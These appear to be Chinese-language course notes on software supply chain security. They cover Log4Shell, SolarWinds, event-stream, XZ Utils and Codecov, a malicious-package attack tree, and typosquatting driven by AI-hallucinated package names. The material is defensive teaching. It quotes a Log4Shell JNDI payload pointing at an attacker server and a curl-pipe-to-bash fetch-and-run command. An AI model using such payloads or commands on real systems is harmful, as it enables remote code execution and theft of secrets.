> 📎 **拓展(超出 slides)：两种复用，两种失败方式** — 直接复用的包有名字和版本号，上游修好了漏洞，你升级一下就能拿到；扫描工具也能按"包名 + 版本"查出你是否受某个已知漏洞影响。定制复用的代码却失去了名字和版本：它散落在你自己的文件里，扫描工具认不出它来自哪个库，上游的修复也永远到不了你这份副本。S62 那个问题"我们依赖了哪些外部代码"，业界的标准答案叫 **SBOM**（Software Bill of Materials，软件物料清单）：一份列出软件里全部组件及其版本的清单。有了它，一个新漏洞公布时，"我们受不受影响"能在几小时内回答，而不是几周。

### 7.3 什么是软件供应链 (S63, S64)

S63 给出了定义：**软件供应链**（software supply chain）是**在整个软件开发生命周期中涉及的人、软件组件、工具、基础设施和流程的集合**。S64 列出了四类例子：

- 开源库和其他软件组件依赖；
- 开发工具和平台（例如 IDE、构建系统、GitHub/GitLab、CI/CD）；
- 基础系统（操作系统、包管理器、编译器）；
- 制品仓库和包仓库（例如 npm、PyPI、Maven Central、Docker Hub）。

讲师在这里出了一道快问快答：**CI/CD 算不算供应链的一部分？** 它是软件开发生命周期的一环，所以算。讲师说，连你写代码用的 IDE 都是供应链的一部分，用来分发软件的 PyPI 也是。

这个定义比"依赖"宽得多。它把**人**放在了第一位：维护者、贡献者都是供应链的一环，§7.10 和 §7.11 会看到攻击者怎样对人下手。它也把本章前面讲过的东西都收了进来：§3 的 CI/CD 是"工具和平台"，§1.2 的编译器是"基础系统"，§3.6 的第三方 Action 是"组件依赖"。用实物供应链打个比方：一家车厂的零件来自几百家供应商，其中一家的零件有缺陷，就可能让好几个品牌一起召回；软件也一样，链上任何一环出问题，都会顺着链传到最终用户。

### 7.4 规模放大了攻击面 (S65)

S65 说：**开源促成了大规模的包复用和共享，形成了高度互联的软件依赖**。它给了几个数字：

- **PyPI**（Python）：约 85 万个包；
- **npm**（JavaScript）：约 370 万个包；
- npm 上的 **lodash**（一个常用的 JavaScript 工具函数库）有**超过 19.7 万个直接依赖它的包**，每周下载量超过 **1.35 亿次**。

S65 的结论是：**大规模的包复用，为软件供应链攻击制造了巨大的攻击面**。讲师解释说，lodash 被大量下游的包复用，所以只要它出一点安全问题，就会形成供应链攻击。

这里的关键是**杠杆**。攻击一家公司，拿下的是一个目标；攻破一个像 lodash 这样被 19.7 万个包直接依赖的组件，等于同时拿下了它所有的下游，以及下游的下游，每周上亿次的安装会替攻击者把恶意代码送出去。这就是为什么供应链成了攻击者青睐的目标：投入一次，回报成千上万倍。

### 7.5 Log4Shell：一个日志库让半个互联网紧急修补 (S66–S68)

S66–S68 分三步展开了一个例子：

- **背景**（S66）：**Log4j 是一个被广泛使用的开源 Java 日志库，被包含在数以千计的 Java 应用和企业系统里。** 讲师说，很多公司用它来管理日志。
- **漏洞**（S67）：**2021 年 12 月，Log4j 被发现有一个严重的远程代码执行（RCE）漏洞，编号 CVE-2021-44228。数以百万计的应用可能受到影响，因为它们直接或间接地依赖 Log4j。**
- **处置**（S68）：**数以千计的应用需要紧急修补、重新构建、重新部署。有的组织在缓解措施到位之前，暂时停用或限制了面向互联网的服务。**

讲师解释，这个漏洞让攻击者能在 Log4j 里执行远程代码；受影响的应用有的直接用 Log4j，有的是传递依赖（§7.1）。有的组织干脆断开了互联网访问，因为任何一个互联网用户都能触发这个漏洞，在补丁到位之前，断网是唯一立即见效的办法。

> 📎 **拓展(超出 slides)：Log4Shell 是怎样触发的** — Log4j 2 有一个叫 "lookup" 的功能：记录日志时，它会展开消息里形如 `${...}` 的表达式，其中一种是 JNDI lookup，能从一个远程的 LDAP 服务器上取回一个 Java 对象。于是，只要应用把攻击者能控制的任何一段文字写进了日志，比如登录时的用户名、HTTP 请求里的 User-Agent、游戏里的一句聊天，攻击者在里面写上 `${jndi:ldap://攻击者的服务器/a}`，Log4j 就会去连攻击者的服务器，下载并运行他的代码。这正是 §7.2 说的**继承的假设**：Log4j 默认日志内容只是无害的数据，而几乎每个应用都会把用户输入写进日志。它也说明了 S68 为什么要"重新构建、重新部署"：Log4j 被打包在应用里，升级它就得重新走一遍 §2 的 CI/CD。而许多团队花了好几周，才弄清自己有没有间接用到它，这正是 §7.2 那个 SBOM 要回答的问题。

讲师在这里留了一个问题：**每次发现漏洞，开发者总是发布一个新版本、让大家升级，为什么不直接把补丁打进现有的版本里？** 答案在 §7.9。

### 7.6 供应链攻击与 SolarWinds (S69)

Log4Shell 是一个**意外**的漏洞：没有人故意把它放进去。S69 讲的是**故意**的攻击。它的定义是：**软件供应链攻击（software supply chain attack）是一种网络攻击，它攻破软件供应链中的一个或多个组件，以间接地攻破下游的软件或其用户**。

注意"间接"这个词。攻击者真正的目标是下游用户，但他不直接攻击这些用户，而是攻击他们都信任的那个上游。区分一下：Log4Shell 是**供应链风险**（一个被广泛复用的组件出了漏洞），SolarWinds 是**供应链攻击**（有人故意利用了供应链）。

S69 的例子是 **SolarWinds 攻击（2020）**：

- **攻击者攻破了构建环境**；
- **一个恶意组件被插进了官方更新**；
- **客户通过一条可信的更新渠道，安装了后门**。

S69 的配图把过程画成一条链：攻击者攻破构建环境 → SolarWinds 的构建服务器 → 在构建中注入恶意代码 → **Orion 软件更新（带有数字签名）** → 发布官方更新 → 官方更新服务器 → 客户 A（政府）、客户 B（企业）、客户 C（公司）→ 后门被安装。图下的红字是：**攻击者攻破了一个可信的构建流程，于是客户通过官方渠道安装了恶意更新**。

讲师说，这和 §3.5 被攻破的 CI runner 一样：攻击者攻破的是构建环境，把恶意代码插进了 SolarWinds 的软件，软件更新发布到官方渠道，被包括政府、企业在内的大量下游用户下载。**只往一个软件里注入恶意代码，所有下游用户都会受影响，供应链放大了攻击。**

请特别注意配图里的"**Digitally Signed**"。这个恶意更新是带着 SolarWinds 合法签名发出去的。§3.8 的表说过，签名证明的是"这个文件出自持有私钥的人、签发后没被改过"，而 SolarWinds 的恶意代码是在构建阶段、**签名之前**进去的，签名忠实地给它盖了章。客户的验证全部通过，因为从签名的角度看，这确实是 SolarWinds 发布的更新。对付这类攻击，要靠 §3.9 的另外几项：隔离和加固构建系统，来源证明，以及可复现构建（拿独立重建的结果和官方发布的比对）。

> 📎 **拓展(超出 slides)：SolarWinds 的规模** — 被植入后门的是 SolarWinds 的网络监控软件 Orion。这类软件为了监控整个网络，本身就拥有很高的权限。约 18,000 个客户下载了带后门的更新（后门后来被称为 SUNBURST），其中包括多个美国政府部门；攻击在 2020 年 12 月才被发现，此前已潜伏数月。

### 7.7 攻击树：把恶意代码注入依赖树的各条路径 (S70)

S70 引用了一张**攻击树**（attack tree）。攻击树的根是攻击者的目标，每个子节点是实现上一层目标的一种办法，越往下越具体。这张树来自一篇综述论文《Backstabber's Knife Collection》，它整理了开源包仓库里真实出现过的恶意包攻击。树根是**把恶意代码注入依赖树**（Injection of Malicious Code into dependency tree），下面分两大路：

- **创建一个新包**（Create New Package），让人把它装进去：伪装成有用的包（**Trojan Horse**），起一个像热门包的名字（**Typosquatting**），或者抢注一个被删掉的包名（**Use After Free**）；
- **感染一个已有的包**（Infect Existing Package），利用人们对它已有的信任，又分三条路：
  - **注入源代码**（Inject into Source）：以贡献者身份提交 **pull request**；或者以维护者身份直接 **commit**，靠的是盗用的弱凭据或 API token，或者靠**社会工程**成为维护者；
  - **在构建时注入**（Inject during the Build）：**攻破构建系统**，篡改构建时下载的包，或者在共享的系统上运行恶意构建；
  - **注入仓库系统**（Inject into Repository System）：用盗来的凭据或 API token 直接发布，利用仓库系统本身的漏洞，或者把恶意版本部署到另一个仓库或镜像站。

图 11 重画了这张树，橙色是本章讲到真实案例的那些路径。

```d2 图 11 · 向依赖树注入恶意代码的攻击树（按 S70 重画，原图出自 Backstabber's Knife Collection）。两大路：自己创建新包，或者感染一个已有的包。橙色是本章讲到真实案例的路径，见 §7.13 的对照表
direction: right
root: "向依赖树\n注入恶意代码" {class: key}
new: "创建新包" {
  grid-columns: 1
  trojan: "Trojan Horse\n伪装成有用的包"
  typo: "Typosquatting\n名字像热门包" {class: warn}
  uaf: "Use After Free\n抢注被删的包名" {class: warn}
}
inf: "感染已有的包" {
  grid-columns: 1
  src: "注入源代码" {
    grid-columns: 2
    pr: "提交 PR\n以贡献者身份" {class: warn}
    cm: "直接 commit\n以维护者身份" {class: warn}
  }
  bld: "在构建时注入" {
    grid-columns: 1
    cbs: "攻破构建系统" {class: warn}
  }
  reg: "注入仓库系统" {
    grid-columns: 3
    r1: "盗用发布\n凭据"
    r2: "利用仓库\n漏洞"
    r3: "部署到\n镜像站"
  }
}
root -> new
root -> inf
```

这张树把本章的前几节连了起来。"提交 PR"正是 §3.4 的不可信 PR；"攻破构建系统"正是 §3.5 被攻破的 runner；"盗用发布凭据或 API token"则把 §5 和 §7 接上了：§5.3 那 2900 万个泄露的秘密里，有不少就是 npm、PyPI 的发布 token，拿到一个，攻击者就能以维护者的名义发布一个恶意版本。下面四节按 slides 的顺序讲讲树上的几条路。

### 7.8 攻击手法：typosquatting 与 AI 幻觉 (S71–S73)

**Typosquatting**（抢注错拼名）的三步是（S71）：

1. **发布一个恶意包，名字和某个热门包很像，诱骗用户安装它。** S71 的例子：代码里写的是 `from sklearn import svm`，正确的安装命令是 `pip install scikit-learn`，恶意的则是 `pip install sklearn`；
2. **把恶意包发布到公共的包仓库**（例如 PyPI）；
3. **等着用户打错包名，装上恶意包。**

这个例子选得很巧。scikit-learn 是一个机器学习库，用法和 TensorFlow 类似；它在代码里的**导入名**是 `sklearn`，在 PyPI 上的**包名**却是 `scikit-learn`。用户照着代码里的名字去装，最自然的输入就是 `pip install sklearn`。讲师说，攻击者只要把恶意包发布到公共仓库，等着用户犯错就行。

> 📎 **拓展(超出 slides)：sklearn 这个名字后来怎样了** — 现实中，PyPI 上的 `sklearn` 这个名字由 scikit-learn 的维护者占着：它不含任何功能，现在安装会直接报错，提示你改装 `scikit-learn`。这本身就是一种防御，叫**防御性注册**：维护者抢先把容易混淆的名字注册下来，不留给攻击者。常见的混淆手法还有很多：打错字母、加减连字符，加上 `-dev`、`-cli` 这类后缀，或者用长得像的字符替换（2019 年 PyPI 上就出现过把小写 l 换成大写 I 的 `jeIlyfish`，冒充 `jellyfish`，用来偷 SSH 和 GPG 密钥）。

S72 加了一层新的风险：**AI 代码生成的普及让这个问题更严重，因为 AI 模型可能"幻觉"出根本不存在的软件包和依赖。** S72 的例子：

- 正确的命令：`pip install huggingface_hub`；
- AI 推荐的命令：`pip install huggingface_cli`；
- 有人注册了一个**空的** `huggingface-cli` 包，**三个月内下载量超过 30,000 次**。

讲师解释，Hugging Face Hub 可以看成一个机器学习的模型中心，托管着成千上万的模型。你也许觉得自己会打错字，可用 AI 生成代码时，AI 总不会打错吧？问题是 AI 会**幻觉**（hallucination），生成一些并不存在的东西，而 AI 幻觉恰恰加速了 typosquatting。研究人员为了验证这种攻击是否可行，注册了这个空包，结果三个月里有三万多次下载，这些用户都是被 AI 误导去装这个包的。讲师也提醒，这项研究是大约一年前做的，现在的 AI 是否还会这样推荐，不得而知。

注意一个细节：AI 推荐的是下划线的 `huggingface_cli`，研究者注册的是连字符的 `huggingface-cli`，为什么能接住这些下载？因为 PyPI 规定包名里的 `-`、`_`、`.` 视为同一个字符（📎），两种写法装的是同一个包。

> 📎 **拓展(超出 slides)：slopsquatting** — 这种专门抢注 AI 幻觉出来的包名的攻击，后来有了一个专门的名字：**slopsquatting**。它比传统的 typosquatting 更好预测：同一个模型面对相似的问题，往往会反复幻觉出同一个名字，攻击者只要多问几次 AI、把它常编的名字注册下来就行。防御办法是：不要直接运行 AI 给出的 `pip install`，先到 PyPI 上确认这个包存在、名字对、由官方维护、下载历史正常、有对应的源码仓库。

### 7.9 Use After Free：为什么发布过的版本不能改 (S73)

S73 在 typosquatting 下面加了一行：**相关的攻击手法：Use After Free**。它在图 11 里和 typosquatting 并列，同属"创建新包"。

这个名字借自内存安全。程序里的 use-after-free 漏洞是指：一块内存已经被释放，后来又被分配给了别人，程序却还在用原来的指针访问它，读到的就是别人的数据。换到包仓库里：一个包名被原作者**删除**（"释放"）了，攻击者重新注册了这个名字（"再分配"），而所有还在依赖这个名字的项目，下次安装时拿到的就是攻击者的代码。

讲师从另一个角度讲了这件事，顺便回答了 §7.5 留下的问题。设想你依赖 GitHub 上的某个库，有一天开发者把仓库删了，会发生什么？如果你本地有一份副本，程序照样能跑；如果没有，程序就**崩了**。正因如此，现在的包管理器**不允许开发者修改或删除已经发布的版本**：一旦发布，就不能删、不能改，只能发布一个新版本。所以每次发现漏洞，开发者都是发布一个带补丁的新版本，让大家升级。

> 📎 **拓展(超出 slides)：left-pad 事件** — 2016 年，npm 上一个只有十来行代码、用来在字符串左边补空格的小包 left-pad 被作者撤下，依赖它的大量项目（包括 Babel 这样的知名工具）一夜之间安装失败，构建全部中断。这是讲师说的"程序会崩"的真实版本。事后 npm 收紧了撤包的规则。"已发布的版本不可变"同时防住了两件事：一是不会因为上游删包而全体崩溃；二是不会有人（包括盗了号的攻击者）悄悄替换一个大家已经审查过、锁定过的版本号背后的代码。补丁只能作为新版本出现，下游就有机会看到它、审查它、再决定升级。

### 7.10 攻击手法：成为维护者 (S74–S76)

第二条路是"感染已有的包"里的"以维护者身份 commit"。S74 的三步：

1. **拿到一个热门开源项目的维护者权限**（例如 npm 包 `event-stream`）；
2. **发布一个新版本，里面加进一个恶意依赖**（`flatmap-stream`）；
3. **受害者在日常安装或更新依赖时，自动下载了被攻破的包。**

S75 给出了真实案例：**event-stream（npm）。那个恶意依赖专门针对 Copay 加密货币钱包的用户，企图偷走他们的比特币私钥。** 讲师说，有用户在一次软件更新后发现钱包里的私钥丢了，追查下去，发现是这段恶意代码在偷加密货币钱包。第 3 周讲过，私钥就是链上的权力：偷走私钥，就等于偷走了币。

S76 给出了缓解措施：**要求多个维护者审查并批准发布；监控依赖的更新**。讲师的建议是：每次引入一个库，都要做一次代码审查，确认它足够安全；每次要把它升级到新版本，还要再审查一次。

> 📎 **拓展(超出 slides)：event-stream 的维护权是怎么到手的** — 2018 年，event-stream 的原作者早已不再维护它。一个陌生人主动表示愿意帮忙，原作者就把发布权限交了出去。新维护者先发了几个正常的版本，然后把 `flatmap-stream` 加成依赖，恶意代码就藏在这个新依赖里，而且只在 Copay 钱包的构建环境里才会解密运行，别的项目装了也毫无异样。攻击者没有攻破任何东西，他只是**开口要**，这就是攻击树上的"社会工程成为维护者"。它能自动扩散，还靠一个机制：`package.json` 里常写 `"event-stream": "^3.3.4"` 这样的版本范围，`^` 的意思是"任何兼容的更新版本都可以"，于是下一次 `npm install` 就自动装上了新版本，没有人做过决定。对策是用 **lockfile**（`package-lock.json`）把每个依赖锁定到确切的版本和内容哈希，让升级成为一次有人审查的、刻意的改动，这正是 S76 "监控依赖的更新"的落实。

### 7.11 XZ Utils：攻击发布流程，而不只是源代码 (S77)

S77 是本章最精巧的一个案例。它的核心思想写在最上面：**攻击者瞄准的是构建和发布流程，而不只是看得见的源代码**。S77 的时间线：

- **2021–2022 年：赢得信任。** 攻击者逐渐成为 XZ Utils 的可信贡献者。
- **2024 年 2–3 月：操纵发布制品。** 恶意的构建逻辑被藏在发布用的 tarball 和构建过程里。
- **2024 年 3 月 29 日：带后门的版本发布。** XZ Utils 5.6.0 和 5.6.1 被正式发布。
- **下游暴露。** Linux 发行版打包了受影响的版本，下游系统随之暴露。
- **发现与修复。** 后门被发现，受影响的版本被撤回。

S77 底部的结论是：**这不只是一个有漏洞的依赖。攻击者操纵了信任、发布制品、打包和下游分发。**

讲师的讲解补上了几个关键点。XZ Utils 是一个压缩工具，Linux 默认就带着它，而 Linux 是许多大公司的服务器系统。攻击者先成为这个项目的维护者，然后在构建之后插入恶意逻辑：**源代码是正常的，安全的，可构建出来的东西不是**。这个后门能让人**不经认证就控制你的服务器**：平时有人想登录你的电脑，必须知道口令或者通过认证，而这个后门绕过了这一切。考虑到大多数服务器跑的是 Linux，而 Linux 默认带着 XZ Utils，这非常危险。讲师说，这个后门是一位研究人员**偶然**发现的：他注意到登录 Linux 服务器时比平时慢，于是追查下去。正因为发现得早，它没有造成实际的危害；如果没被发现，影响会非常大。攻击者为了植入这个后门，花了将近三年。

S31 那句"发布出去的制品，可能并不是审查者检查过的那份软件"，在这里得到了最好的例证。图 12 画出了后门藏身的两条路。

```d2 图 12 · XZ Utils 后门的两条路（S77；技术细节为📎拓展）：审查者看的 git 仓库里只有两个「损坏的测试文件」，看不出任何问题；真正的触发脚本只放在发行版下载的 tarball 里。发行版用 tarball 构建 liblzma 时，脚本从测试文件里解出后门、编进库里，再经 libsystemd 进入 sshd
direction: down
atk: "维护者 Jia Tan\n用两年多赢得信任" {class: warn}
git: "git 仓库（审查者看的）\n两个「损坏的测试文件」藏着后门"
tar: "release tarball（发行版下载的）\n多出一个改过的 build-to-host.m4" {class: warn}
bld: "发行版构建 liblzma\n脚本解出后门、编进库里"
sshd: "sshd 经 libsystemd 加载 liblzma\n持有特定私钥者可远程执行命令" {class: warn}
atk -> git
atk -> tar
git -> bld
tar -> bld
bld -> sshd
```

> 📎 **拓展(超出 slides)：XZ 后门的技术细节与时间线的更正** —
> - **藏在哪里**：发布用的 tarball 里多了一个改过的构建脚本 `build-to-host.m4`，它**不在 git 仓库里**。构建时，这个脚本从仓库里两个看起来是"损坏的压缩文件、用于测试"的二进制文件中解出后门代码，编进 liblzma 库。只读 git 仓库的审查者，看到的是一些无害的测试数据。
> - **怎样进入 SSH**：liblzma 是一个压缩库，本来和 SSH 毫无关系。但 Debian、Fedora 等发行版给 OpenSSH 打了补丁，让 sshd 链接 libsystemd，而 libsystemd 又依赖 liblzma，于是后门被加载进了 sshd 进程。它篡改了 sshd 验证公钥的过程，**只有持有攻击者那把特定私钥的人**才能用它在服务器上执行命令，并不是"任何人"都能登录。
> - **怎样赢得信任**：原维护者多年来独自维护这个项目，身心俱疲；几个可疑的账号在邮件列表上抱怨更新太慢、催他找人帮忙，"Jia Tan"适时出现，从提交小补丁做起，逐步拿到了发布权限。这就是 §1.1 表里"社区驱动"的另一面。
> - **怎样被发现**：微软工程师、PostgreSQL 开发者 Andres Freund 在做性能测试时，发现 SSH 登录要多花约半秒，sshd 的 CPU 占用也不正常，追查之下发现了后门，并于 **2024 年 3 月 29 日**公开披露。
> - **时间线的更正**：按公开记录，5.6.0 发布于 2024 年 2 月 24 日，5.6.1 发布于 3 月 9 日；**3 月 29 日是后门被公开披露的日子**，不是发布日。S77 把两件事写在了同一行。考试时按 slides 的要点答（攻击者先花两年赢得信任，再操纵发布制品，5.6.0 和 5.6.1 被植入后门，2024 年 3 月底被发现），知道真实的先后顺序即可。
> - **为什么危害有限**：后门被发现时，带毒的版本只进入了 Fedora 的开发版、Debian 的测试版等少数滚动更新的发行版，还没进入主流的稳定版。

这个案例几乎串起了本章的每一节。它利用了开放协作和社区驱动（§1.1）；它让 S31 的问题变得具体：审查者看的源代码和用户拿到的制品不是同一个东西；可复现构建本可以发现它，因为从 git 仓库构建出来的结果和 tarball 构建出来的结果不一样（事后，一些发行版改成了直接从 git 构建）；而它最后被发现，靠的是一个人注意到了半秒钟的延迟，§2.7 的金丝雀发布那套错误率、崩溃率的指标，对它毫无办法。

### 7.12 攻击手法：攻破构建系统 (S78–S80)

最后一条路是攻击树上的"在构建时注入"。S78 的三步：

1. **攻破软件的构建系统或 CI/CD 流水线；**
2. **在构建过程中注入恶意代码；**
3. **受害者从官方发布渠道下载并安装了被攻破的软件。**

S79 的真实案例：**Codecov（2021）。被攻破的 Bash Uploader 暴露了数千条 CI/CD 流水线的凭据。** S80 的缓解措施：**限制对构建系统的访问；隔离并加固构建环境；用代码签名和完整性验证保护软件发布。**

讲师说，这和 CI 有关：构建系统被攻破，成千上万条 CI/CD 流水线的秘密泄露给了攻击者，用的就是前面讲过的那种手法（§3.4 的 `env` 加 `curl`）。讲师给出的缓解办法是：用短生命周期的 runner，并把 runner 的权限降到最小。

> 📎 **拓展(超出 slides)：Codecov 事件的经过** — Codecov 是一个统计测试覆盖率的服务。它的客户在 CI 流水线里运行一个叫 Bash Uploader 的脚本，常见的写法是直接从 Codecov 的服务器下载、交给 bash 执行（`curl -s https://codecov.io/bash | bash`）。2021 年 1 月 31 日起，攻击者利用从 Codecov 自己的 Docker 镜像构建过程中拿到的一把云存储凭据（又是一个 §5 的秘密泄露），改写了服务器上的这个脚本，加了一行：把 CI 环境变量统统发到攻击者的服务器。§3.3 说过，CI 的秘密就注入在环境变量里，于是成千上万条流水线的 token、密钥一起泄露。4 月 1 日，一位客户在运行前计算了脚本的 SHA-256，发现它和 Codecov 在 GitHub 上公布的校验和对不上，事情才败露。这正是 S31 的 `sha256sum -c` 在现实中发挥作用：校验和从另一条渠道（GitHub）获得，攻击者改得了下载服务器，改不了它。这个案例也是 §3.6 的翻版：Bash Uploader 就是无数流水线里的一个第三方 CI 组件。

### 7.13 七个案例放在一起看

本章出现的真实案例，可以按攻击树（图 11）归类，看每一次被滥用的是哪一份信任，以及本章的哪项措施能防：

| 案例 | 年份 | 攻击树上的位置 | 被滥用的信任 | 本章对应的防御 |
|---|---|---|---|---|
| Log4Shell（S66–S68） | 2021 | 不是攻击，而是被广泛复用的组件里的漏洞（供应链风险） | 下游相信一个日志库只会"记日志" | SBOM 弄清依赖；补丁以新版本发布，快速重建、重新部署（§7.5、§7.9） |
| SolarWinds（S69） | 2020 | 在构建时注入：攻破构建系统 | 客户相信带签名的官方更新 | 隔离加固构建系统；来源证明；可复现构建（§3.8、§3.9） |
| typosquatting / AI 幻觉（S71–S72） | 持续 | 创建新包：Typosquatting | 用户相信自己（或 AI）给出的包名 | 核对官方包名；防御性注册；不直接执行 AI 给的安装命令（§7.8） |
| Use After Free（S73） | — | 创建新包：抢注被删的包名 | 依赖者相信一个名字永远指向同一个项目 | 已发布版本不可变；包名不回收；lockfile（§7.9） |
| event-stream（S74–S76） | 2018 | 注入源代码：社会工程成为维护者 | 下游相信维护者和 `^` 版本范围 | 多人审批发布；lockfile；审查依赖更新（§7.10） |
| XZ Utils（S77） | 2024 | 注入源代码（成为维护者）+ 操纵发布制品 | 发行版相信维护者发布的 tarball | 从 git 可复现构建；比对 tarball 与仓库；来源证明（§3.8、§7.11） |
| Codecov（S79） | 2021 | 攻破构建系统；第三方 CI 组件 | 数千条流水线相信 curl 下来的脚本 | 校验和；固定版本；最小权限、短期凭据（§3.6、§3.9、§7.12） |

读这张表时注意最后两列。每一个案例被滥用的都是一份**合理的**信任：相信官方更新、相信维护者、相信自己敲的包名，这些都不是愚蠢的行为，没有它们，现代软件开发根本无法进行。防御的方向不是"什么都不信"，而是 S81 说的**持续验证**：签名、校验和、来源证明、可复现构建、lockfile、多人审查，都是把"默认相信"换成"核对之后再相信"的具体手段。

<details>
<summary>自测：Log4Shell 和 SolarWinds 都被称为"供应链事件"，它们最根本的区别是什么？各自的防御重点在哪里？</summary>

Log4Shell 是一个被广泛复用的组件里的意外漏洞，没有人故意把它放进去，属于供应链风险；防御重点是知道自己依赖了什么（SBOM），能快速升级到新版本、重新构建和部署（S68）。SolarWinds 是有人故意攻破构建环境、把后门插进官方更新，符合 S69 对供应链攻击的定义（攻破供应链的组件，以间接攻破下游）；防御重点是保护构建系统本身，并且不能只靠签名，因为恶意代码在签名之前就进去了，要用来源证明和可复现构建来验证构建过程。

</details>

<details>
<summary>自测：同学让 AI 帮忙写一段调用 Hugging Face 模型的代码，AI 在开头写了 pip install huggingface_cli。直接运行有什么风险？应该怎么做？</summary>

AI 可能幻觉出不存在的包名（S72）。如果攻击者已经抢注了这个名字（S72 里研究者注册的空包 huggingface-cli，三个月有三万多次下载；PyPI 把 _ 和 - 视为同一个字符），运行这条命令就会装上攻击者的代码，安装脚本在你的电脑上以你的权限执行。应该先到 PyPI 上核对：这个包是否存在、是否由官方维护、下载历史和源码仓库是否正常；Hugging Face 官方的包是 huggingface_hub（S72）。

</details>

<details>
<summary>自测：XZ Utils 的维护者是"自己人"，代码审查为什么没能发现后门？S31–S32 里哪一项措施本可以发现它？</summary>

触发后门的构建脚本 build-to-host.m4 只放在发布用的 tarball 里，不在 git 仓库里；后门代码则伪装成仓库里的二进制测试文件。审查者读的是 git 仓库，看不到会执行的恶意部分，这正是 S31 说的"发布出去的制品可能不是审查者检查过的那份软件"。可复现构建本可以发现它：从 git 仓库的同一个版本构建出来的结果，和从 tarball 构建出来的结果不一样，一比对就会露馅；来源证明也能让下游核对"这个制品是否由预期的源代码构建"。

</details>

<details>
<summary>自测：把 event-stream、Codecov 分别放到 S70 攻击树的哪个分支上？各自最直接的防御是什么？</summary>

event-stream：感染已有的包 → 注入源代码 → 以维护者身份 commit，具体是社会工程成为维护者（原作者把发布权交给了主动请缨的陌生人）；防御是 S76 的多人审批发布、监控依赖更新，以及用 lockfile 避免自动升级到新版本。Codecov：感染已有的包 → 在构建时注入 → 攻破构建系统（它的脚本是无数流水线的第三方 CI 组件）；防御是 S80 的限制构建系统访问、加固构建环境、完整性验证，具体到用户这边，就是运行前核对脚本的校验和、把版本固定下来、给 CI 秘密最小权限和短有效期。

</details>

## 8. 结语与下一讲 (S81, S82)

S81 的四条结论是全章的总结：

1. **现代软件高度依赖第三方开源组件。**
2. **软件供应链的每一个阶段，都可能成为攻击面。**
3. **信任应该被持续验证，而不是被默认。**
4. **保护软件供应链，既需要技术上的控制，也需要组织上的控制。**

第四条值得多想一下。本章的很多防御是技术性的：签名、校验和、短期凭据、最小权限、秘密扫描。可另一些是组织性的：要求两个人批准发布（S76），给关键的开源项目更多维护者和资金（XZ 的教训），规定谁能合并进主分支（S32），定期轮换秘密、上线前过一遍配置清单（S43、S49）。只有技术、没有流程，签名密钥会被随手放进仓库；只有流程、没有技术，审查者也看不到 tarball 里多出来的那个脚本。

S82 提出了下一讲的问题：**开源软件被广泛使用，可很多开源组件含有已知漏洞。怎样在它们酿成安全事故之前就发现它们？** 讲师最后说，像 Linux 这样有几千万行代码的项目，靠人工找漏洞是不可能的；下一讲会介绍自动分析程序的方法。第 10 周的讲座（"Static and Dynamic Analysis"）就从 §5.7 那个拼接 token 的例子开始，讲静态分析和动态分析怎样自动地在大型开源代码里找出漏洞和泄露的秘密。

## 本章小结 (Key takeaways)

- **开源软件是现代软件的基础**：98% 的商业代码库含有开源组件，87% 含有已知的开源漏洞（S6、S7）。改成闭源解决不了问题，没有哪家公司能独自维护 Linux 这样的项目；要做的是管理开源带来的风险。OSS 生态从开发者、托管平台、项目、CI/CD、包仓库一直到下游用户，**每一层都信任上一层**（S8）。
- **CI/CD 把代码改动自动变成软件**：CI 在 runner 上构建、跑单元测试和集成测试，CD 经 staging 和审批部署到生产（S10–S16）。不同环境用不同的凭据，普通 CI job 只拿测试 token（S17）。部署策略控制新版本"什么时候、在哪里、向多少人"暴露：rolling 逐台替换，blue-green 切换流量、回滚最快，canary 按比例放量、爆炸半径最小（S18–S22）。
- **CI/CD 是一道安全边界**：它复杂、交互多、权限高（S23），秘密在运行时注入 runner 的环境变量（S25、S26），所以**控制了 CI 里运行什么代码，就控制了谁能拿到令牌**。四类漏洞是：执行不可信的 PR 代码（`pull_request_target` 加检出 PR，S27）、被攻破的 runner（S28）、第三方 CI 组件（S29）、被篡改的构建产物（S30）。
- **完整性要分清每种验证证明了什么**：校验和证明文件没变，签名证明出自谁之手，来源证明说明由哪份源代码、哪个流程构建，可复现构建检验构建环境是否可信（S31）。缓解措施是在每个阶段都减少信任：受保护分支和强制审查、短生命周期 runner、最小权限和 OIDC 短期凭据、校验和加签名加来源证明加可复现构建（S32）。
- **安全的代码可以被不安全地部署**（S34）：配置决定谁能访问、拥有什么权限、安全检查开没开（S35）。要改掉默认口令、关掉 debug、只暴露需要的端口、管理界面不对外（减少暴露），以非 root 运行、不用特权容器、不挂 docker.sock、只挂需要的目录、不关 TLS 验证（减少权限、保留检查）（S36–S43）。
- **硬编码的秘密删不掉**：Git 历史、镜像层、安装包和前端代码都会保留它（S46、S48），泄露后唯一有效的补救是立即作废并轮换。秘密应在运行时从环境或保险库注入（S49）。扫描技术有四种：模式、熵、上下文、验证（S50），熵检测会漏掉弱口令和短密钥、误报 base64 和哈希，所以要组合使用；S51 进一步追踪数据流向 Authorization 请求头。
- **口令弱、被泄露、被重用**，撞库靠的就是重用（S52、S53）。**passkey 是第 6 周协议 9 的标准化**：服务器出随机挑战，设备用私钥签名，服务器用公钥验证（S55）；服务器只存公钥，泄露了也没用；passkey 和域名绑定，设备核对来源，所以能防钓鱼（S56）；多设备同步用端到端加密，云端只见密文（S57–S59）。
- **软件供应链包括人、组件、工具、基础设施和流程**（S63），CI/CD 和 IDE 都在其中。复用代码也复用风险，64% 的组件是传递依赖（S61、S62）。供应链攻击通过攻破上游来间接攻击下游（S69），攻击树分"创建新包"（typosquatting、AI 幻觉包名、Use After Free）和"感染已有的包"（注入源代码、在构建时注入、注入仓库系统）两路（S70）。SolarWinds、event-stream、XZ Utils、Codecov 滥用的都是合理的信任，防御的方向是 S81 的那句话：**信任应该被持续验证，而不是被默认**。

